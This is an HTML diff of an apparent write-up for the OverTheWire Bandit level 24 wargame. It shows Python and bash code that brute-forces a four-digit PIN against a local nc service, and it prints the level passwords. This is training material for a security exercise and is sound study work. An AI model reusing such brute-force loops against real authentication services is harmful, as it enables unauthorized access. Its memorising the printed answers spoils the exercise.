@@ -7,42 +7,45 @@
 
 <h2>My solution</h2>
 
-<p>After <code>ssh</code>ing to bandit24, I connected to <code>localhost</code> to see what was going on.</p>
+	<p>After <code>ssh</code>ing to bandit24, I connected to <code>localhost</code> to see what was going on.</p>
 
-<code>nc localhost 30002</code>
+	<p><code>nc localhost 30002</code></p>
 
-This returns the following:
-<code>I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.</code>
+<p>This returns the following:<br>
+<code>I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.</code><br>
 
-Testing it with the password for this level + 0000, we get:
+Testing it with the password for this level + 0000, we get:<br>
 
 <code>Wrong! Please enter the correct pincode. Try again.</code>
 
-And this repeats until you find the right 4-digit pincode. There are 10,000 possibilities here, so we need to automate that.
+And this repeats until you find the right 4-digit pincode. There are 10,000 possibilities here, so we need to automate that.</p>
+
 
 <h2>Step 1</h2>
 
 <p>Run this Python code to generate a file with the password and all possible pincodes.</p>
 
-<code>
-from itertools import product
+<p>
+	<code>
+		from itertools import product
 
-n = '0123456789'
+		n = '0123456789'
 
-a = [''.join(i) for i in product(n, repeat=4)]
+		a = [''.join(i) for i in product(n, repeat=4)]
 
-b = ['UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + i for i in a]
+		b = ['UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + i for i in a]
 
-f = open('passpin.txt', 'w')
-f.write('\n'.join(b))
-f.close()
-</code>
+		f = open('passpin.txt', 'w')
+		f.write('\n'.join(b))
+		f.close()
+	</code>
+</p>
 
 <h2>Step 2</h2>
 
 <p><code>ssh</code> into bandit24, create your directory in the <code>/tmp</code> directory, copy all the lines from passpin.txt into a new file. Then write the following script in your editor of choice, save it in your directory, and don't forget to <code>chmod</code> it to make it executable:</p>
 
-<code>
+<p><code>
 #!/bin/bash
 
 while read line; do
@@ -50,7 +53,7 @@ while read line; do
 	sleep 0.12
 done < passpin.txt | nc localhost 30002 > /tmp/yourfolder/yourfile
 
-</code>
+</code></p>
 
 <p>The <code>sleep</code> command is necessary because the daemon is not instantly available all the time. After around 20 minutes, the script will have finished running, and then you just <code>grep bandit yourfile</code> and get: <code>The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</code>.
 
